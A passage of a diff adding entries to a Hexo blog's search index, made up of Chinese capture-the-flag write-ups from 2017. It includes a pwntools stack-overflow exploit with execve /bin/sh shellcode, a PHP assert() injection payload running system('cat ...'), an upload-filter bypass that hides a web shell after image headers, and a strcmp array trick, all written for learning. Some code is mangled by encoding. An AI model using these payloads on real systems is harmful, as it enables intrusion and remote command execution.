//移动临时文件到当前文件目录 echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name; } else { echo &quot;文件不合法！！&quot;; } } ?&gt; 5、服务端文件内容检测 图像类的文件内容检测 文件幻数检测（图片头格式检测） jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46 gif内容头value= 47 49 46 38 39 61 png内容头value= 89 50 4E 47 绕过：在文件头后加上一句话木马就能绕过 ![](文件上传绕过/png图.png)]]></content>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[babypwn3学习经历]]></title>
+    <url>%2F2017%2F12%2F30%2Fbabypwn3%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86%2F</url>
+    <content type="text"><![CDATA[&lt; !–more–&gt;一:查壳checksec babypwn3显示： 没有什么保护二：代码int vulFunc(){char buf; // [sp+0h] [bp-88h]@1char v2; // [sp+7Fh] [bp-9h]@1memset(&amp;buf, 0, 0x80u); //初始化buf的128个字节为0 ①puts(“寮勬淇轰亢涔熶笉浼氬惉浣犵殑璇濈殑锛乗n”);read(0, &amp;buf, 0x100u); //读取数据256个字节保存在buf中if ( v2 == 127 )JUMPOUT(CS, &amp;buf); //当v2=127时会去执行栈上的代码return puts(“鐣ョ暐鐣ワ綖\n”);}.text:080484A6 ; =============== S U B R O U T I N E =======================================.text:080484A6.text:080484A6 ; Attributes: bp-based frame.text:080484A6.text:080484A6 public vulFunc.text:080484A6 vulFunc proc near ; CODE XREF: main+46p.text:080484A6.text:080484A6 buf = byte ptr -88h.text:080484A6 var_9 = byte ptr -9.text:080484A6…….text:08048500 jmp esp三：需要一个shellcode能够system(“/bin/sh”)shellcode=”\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”; //感恩师傅，我可以偷懒1.shellcode+任意字符*(127-shellcode长度)+(v2=127)覆盖v2=127，需要用p32()打包from pwn importshellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;p=remote(‘121.42.189.18 ‘,7003)payload = shellcode+’a’(127-len(shellcode))+p32(127)p.recv()p.sendline(payload)raw_input()p.interactive()2.”jmp esp”作为跳板动态定位shellcode③因为当Eip在后续执行过程中，遇到了jmp esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。jmp sep地址=08048500 ，需要用p32()打包from pwn importshellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;p=remote(‘121.42.189.18 ‘,7003)jmp_esp=0x8048500payload = ‘a’140+p32(jmp_esp)+shellcodep.recv()p.sendline(payload)p.interactive()四：进入shell里cat /tmp/flag ⑤①memset() 函数常用于内存空间初始化void memset(void s,int c,size_t n)开辟的空间s的n个字符初始化为c②JumpOut (“Program” [, “Document”])program:指定的应用程序打开文件Document③可用”jmp esp”作为跳板动态定位shellcode1) 用内存中任意一个”jmp esp”的地址覆盖返回地址2) 函数返回后被重定向去执行内存中jmp esp指令3) 由于函数返回后ESP指向返回地址后，jmp esp执行后，CPU将到栈区函数返回地址之后的地方取指令执行4) shellcode的布置。缓冲区前面一段用任意数据填充，把shellcode放在函数返回地址后面。jmp esp执行完就执行shellcode。http://blog.csdn.net/lixiangminghate/article/details/53333710（栈的图画得非常好）http://blog.csdn.net/swjtu100/article/details/50032831（exploit画得很好看）栈指针esp的一个特性：当函数执行ret指令后，Eip寄存器发生了跳转，但Esp还指向函数形参在栈中的地址。当Eip在后续执行过程中，遇到了jmp esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。④flag{g54dwqdqw-f43csad-saDWqd23wdasxsaxdFDWEVC}]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[俄罗斯方块（GG）]]></title>
+    <url>%2F2017%2F12%2F30%2F%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%EF%BC%88GG%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[&lt; !–more–&gt;①查看元素有一个tetris.js的文件②在线代码美化根据题目分数大于1000000分偷懒查找score ③发现有个 “webqwer” [1] + “100.js”webqwer[1]就是e④http://218.76.35.75:65380/e100.js又是[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]这种代码⑤在控制台复制粘贴加执行跳出对话框，里面有flag flag{oT0yTrjU0xhjhj2YTcT8jljMWpzS9tDk}]]></content>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[南邮综合题]]></title>
+    <url>%2F2017%2F12%2F30%2F%E5%8D%97%E9%82%AE%E7%BB%BC%E5%90%88%E9%A2%98%2F</url>
+    <content type="text"><![CDATA[&lt; !–more–&gt;1、打开网页是 jother编码 *jother编码：JavaScript是一种属于网络的脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的jother是另类的javascript工具一堆+!的东西就用jother解码可以打开谷歌浏览器 按F12然后console将那堆解码的东西复制过去 按回车即可解码2、在谷歌浏览器中的console中复制粘贴代码，回车解码得到1bc29b36f623ba82aaf6724fd3b16718.php将http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php改成http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 显示：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里(▼へ▼メ)给了提示，要看tip3、当前页面http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php查看tip（在network里的headers里查看有个history of bash） *history of bash：默认情况下，历史命令是存储在~/.bash_history文件里 4、找/.bash_histroy文件http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history找到一个压缩包zip -r flagbak.zip ./* 用URL=http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip自动下载，下载完解压找到flagflag is:nctf{bash_history_means_what}]]></content>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[babyphp]]></title>
+    <url>%2F2017%2F12%2F30%2Fbabyphp%2F</url>
+    <content type="text"><![CDATA[&lt; !–more–&gt;1、查看源码： 可以发现一共有三个page：home，about，contact还有一个可能存在的page：flag.php2、http://web.jarvisoj.com:32798/?page=flag.php显示：That file doesn’t exist!3、查看about里面有：PHP，GIT,Bootstrap可能有源码泄露，联系到about中有Git，使用GitHack下载源码4、使用GitHash下载源码方法：cmd，并切换到已经下载GitHash-master的py文件目录下python GitHash.py url.gitpython GitHash.py http://web.jarvisoj.com:32798/.git 显示有index.php，about.php，contact.php，flag.php，home.php在GitHash-master的目录下可以找到一个web.jarvisoj.com_32798的文件夹里面有templates和index.php文件*Templates文件夹：该文件夹中存储着常用程序的模板文件，如winword.doc、powerpnt.ppt、excel.xls等。模板就是包含有段落结构、字体样式和页面布局等元素的样式。它决定了文档的基本结构和设置的样式。5、查看了flag.php：&lt;?php// TODO//$FLAG = ‘’;?&gt;6、最后查看index.php：&lt;?phpif (isset($_GET[‘page’])){ $page = $_GET[‘page’];}else {$page = “home”;}$file = “templates/“ . $page . “.php”;assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);?&gt;/PHP assert()assert — 检查一个断言是否为 FALSEPHP 5bool assert ( mixed $assertion [, string $description ] )PHP 7bool assert ( mixed $assertion [, Throwable $exception ] )assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。断言这个功能应该只被用来调试。你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。断言不应该用于普通运行时操作，类似输入参数的检查。作为一个经验法则，在断言禁用时你的代码也应该能够正确地运行。assert() 的行为可以通过 assert_options() 来配置，或者手册页面上描述的 .ini 设置。assert_options() ASSERT_CALLBACK 配置指令允许设置回调函数来处理失败的断言。assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 当信息能够被其他方法捕获，使用断言可以让它更快更方便！/其实真看不懂什么意思 ψ(._.)&gt; 谁来教我php中assert本来是用于调试的，如果assert方法内的代码不为true，则给个Warning提醒。如下面的代码：&lt;?php assert(‘1==2’); ?&gt;执行后会有如下输出： Warning: assert(): Assertion “1==2” failed in D:\green\APMServ5.2.6\www\htdocs\phpinfo.php on line 2 有个assert_option方法可以对assert进行一些控制。7、构造assert()函数会运行接收的语句 http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls templates/;”).’显示：about.phpcontact.phpflag.phphome.phpabout.phpcontact.phpflag.phphome.phpThat file doesn’t exist! http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False and system(‘cat templates/flag.php’);//显示：&lt;?php// TODO//$FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}’;?&gt;That file doesn’t exist!‘,’..’)===False根据assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”)‘,’..’)===False为真system(‘cat templates/flag.php’)显示flag.php的内容*system()函数system — 执行外部程序，并且显示输出string system ( string $command [, int &amp;$return_var ] )参数command要执行的命令。return_var如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。返回值成功则返回命令输出的最后一行， 失败则返回 FALSEFLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}]]></content>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[checkpass]]></title>
+    <url>%2F2017%2F12%2F30%2Fcheckpass%2F</url>
+    <content type="text"><![CDATA[&lt; !–more–&gt;查看源码&lt;?php$pass=@$_POST[‘pass’];$pass1=;//被隐藏起来的密码if(isset($pass)){if(@!strcmp($pass,$pass1)){echo “flag:nctf{}”;}else{echo “the pass is wrong!”;}}else{echo “please input pass!”;}?&gt;php的strcmp函数，传入一个array就好了strcmp()函数在PHP官方手册中的描述是int strcmp ( string str1,stringstr2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。如果传入给出strcmp()的参数是数字呢？$array=[1,2,3];var_dump(strcmp($array,’123’)); //null,在某种意义上null也就是相当于false。http://chinalover.sinaapp.com/web21/使用hackbar插件load URL：http://chinalover.sinaapp.com/web21/index.phppost data：pass[]=1 //传入一个数组]]></content>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[在命令行里运行python脚本]]></title>
+    <url>%2F2017%2F12%2F30%2F%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%87%8C%E8%BF%90%E8%A1%8Cpython%E8%84%9A%E6%9C%AC%2F</url>
+    <content type="text"><![CDATA[&lt; !–more–&gt;打开文本编辑器，notepad语言设置成python脚本第一行一定要写上 #! /usr/bin/env python编辑好之后，将文件保存成 .py格式cd 到运行文件所在目录运行python 文件名.pycmd命令行中输入 python把脚本文件拖拽到当前光标位置，回车报错：File ““ , line 1python hello.pySyntaxError：invalid synta原因：Python命令行中，运行Python代码“python hello.py”是一个脚本命令，不是python代码]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Hello World]]></title>
+    <url>%2F2017%2F12%2F30%2Fhello-world%2F</url>
+    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
+  </entry>
 </search>
